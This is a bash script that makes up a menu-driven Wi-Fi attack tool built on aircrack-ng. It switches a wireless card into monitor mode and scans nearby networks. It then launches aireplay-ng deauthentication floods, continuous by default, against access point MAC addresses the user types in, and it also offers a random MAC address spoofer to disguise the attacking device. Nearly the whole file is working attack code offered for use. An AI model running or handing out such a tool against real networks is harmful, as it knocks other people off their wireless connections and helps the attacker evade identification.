#!/bin/bash
clear
if ! command -v aircrack-ng &> /dev/null; then
    echo "aircrack-ng is not installed. Installing..."
    apt-get update
    apt-get install -y aircrack-ng
    echo "aircrack-ng installed."
else
    echo "checking for aircrack-ng..."
    echo "aircrack-ng is already installed."
fi
clear
show_loading() {
  local duration="$1"
  local interval=0.2
  local symbols=("+" "*" "+" "*")
  local color=("\\e[92m" "\\e[92m" "\\e[92m" "\\e[92m")  

  for ((i = 0; i < duration * 5; i++)); do
    local symbol="${symbols[i % 4]}"
    local color="${colors[i % 4]}"
    echo -ne "${color}Loading... $symbol\\e[0m\r" 
    sleep "$interval"
  done
}
show_loading 5
echo "Loading complete!"
sleep 2
clear
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi
chmod +x launcher.sh
chmod +x Banner.sh
bash launcher.sh
sleep 5
echo " Please wait..."

function show_interfaces() {
  bash Banner.sh
  echo "Connected Network Interfaces:"
  echo "----------------------------"
  interfaces=($(ip link show | awk '/^[0-9]+:/ {print substr($2, 1, length($2)-1)}' | grep -v lo))
  for ((i=0; i<${#interfaces[@]}; i++)); do
    echo "$((i+1)). ${interfaces[i]}"
  done
}

function change_mac_address_random() {
  read -p "Enter the number corresponding to the network interface to change the MAC address: " num

  # Validate the input
  re='^[0-9]+$'
  if ! [[ $num =~ $re ]]; then
    echo "Invalid input. Please enter a valid number corresponding to the interface."
    return
  fi

  if (( num < 1 || num > ${#interfaces[@]} )); then
    echo "Invalid input. Please enter a number within the range of available interfaces."
    return
  fi

  selected_interface=${interfaces[$((num-1))]}
  new_mac=$(printf "%02X:%02X:%02X:%02X:%02X:%02X" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))

  sudo ip link set dev $selected_interface down
  sudo ip link set dev $selected_interface address $new_mac
  sudo ip link set dev $selected_interface up

  echo "MAC address for $selected_interface changed to $new_mac."
  echo "Redirecting in 5s"
}

function deauthenticate() {
    for mac in "${mac_addresses[@]}"; do
        gnome-terminal -- bash -c "aireplay-ng -0 $deauth_packets -a $mac -D $interface; read -p 'Press Enter to close this terminal window...' sudo airmon-ng stop $interface "
    done
    echo "Deauthentication completed for selected MAC addresses."
}

function scan_and_deauthenticate() {
    clear
    while true; do
        bash Banner.sh
        echo "Available wireless network interfaces:"
        echo "0 - Go Back"
        index=1
        for iface in $(ip link show | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}'); do
            if [[ -n $(iwconfig $iface 2>/dev/null | grep "IEEE") ]]; then
                chipset_info=$(ethtool -i $iface | grep driver)
                chipset_name=$(echo $chipset_info | awk '{print $2}')
                manufacturer=$(echo $chipset_info | awk '{print $4}')
                echo "$index - $iface - $manufacturer $chipset_name"
                wireless_interfaces[$index]=$iface
                ((index++))
            fi
        done

        if [[ ${#wireless_interfaces[@]} -eq 0 ]]; then
            echo "No wireless interface detected"
            echo ":("
            sleep 3
            clear
        fi

        echo "Select a wireless interface:"
        read -p "(Enter a number or '0' to Go Back): " choice
        if [[ $choice -ge 0 && $choice -le ${#wireless_interfaces[@]} ]]; then
            if [[ $choice -eq 0 ]]; then
                clear
                return
            fi
            interface=${wireless_interfaces[$choice]}
            echo "Switching to monitor mode..."
            sudo ifconfig $interface down
            sudo airmon-ng start $interface
            new_interface="${interface}mon"
            if [[ -e /sys/class/net/$new_interface ]]; then
                interface=$new_interface
            fi
            sudo ifconfig $interface up
            echo "Monitor mode enabled on $interface"
            echo -e "Scanning for nearby Wi-Fi networks..."
            airodump-ng $interface

            while true; do
                read -p "Enter the number of MAC addresses to deauthenticate: " count
                if [[ $count =~ ^[0-9]+$ ]]; then
                    break
                else
                    echo "Invalid input. Please enter a number."
                fi
            done

            declare -a mac_addresses

            for ((i=1; i<=$count; i++)); do
                while true; do
                    read -p "Enter MAC address $i: " mac
                    if [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
                        mac_addresses+=("$mac")
                        break
                    else
                        echo "Invalid MAC address. Please enter a valid MAC address."
                    fi
                done
            done

            while true; do
                read -p "Do you want to set a custom number of deauthentication packets (y/n): " custom_deauth
                case $custom_deauth in
                    [Yy]* )
                        read -p "Enter the custom number of deauthentication packets: " deauth_packets
                        if [[ $deauth_packets =~ ^[0-9]+$ ]]; then
                            break
                        else
                            echo "Invalid input. Please enter a number."
                        fi
                        ;;
                    [Nn]* )
                        deauth_packets=0
                        break ;;
                    * )
                        echo "Invalid response. Please enter 'y' or 'n'." ;;
                esac
            done            
            deauthenticate
            while true; do
                read -p "Press Q or X to exit to menu: " repeat
                case $repeat in
                    [Qq]* )
                        sudo airmon-ng stop $interface
                        clear
                        break ;;
                    [Xx]* )
                        sudo airmon-ng stop $interface
                        clear
                        return ;;
                    * )
                        echo "Invalid response. Please enter 'Q' or 'X'." ;;
                esac
            done
        else
            echo "Invalid choice. Please enter a valid number."
        fi
    done
}

clear

while true; do
    bash Banner.sh
    echo "Main Menu:"
    echo "1 - Scan and Deauthenticate"
    echo "2 - MAC Address Changer"
    echo "3 - Help"
    echo "4 - About Tool"
    echo "0 - Exit"
    read -p "Enter your choice: " main_choice

    case $main_choice in
        1 )
            scan_and_deauthenticate
            ;;
        2 ) clear
            show_interfaces
            change_mac_address_random
            sleep 5
            clear
            ;;
        3 ) clear
            cat < Manual.md
            sleep 5
            clear
            ;;
        4 ) clear
            cat < README.md
            sleep 5
            clear
            ;;    
        0 )
            clear
            echo "Exiting."
            echo "See you soon :)"
            exit ;;
        * )
            echo "Invalid choice. Please enter a valid number."
            ;;
    esac
done



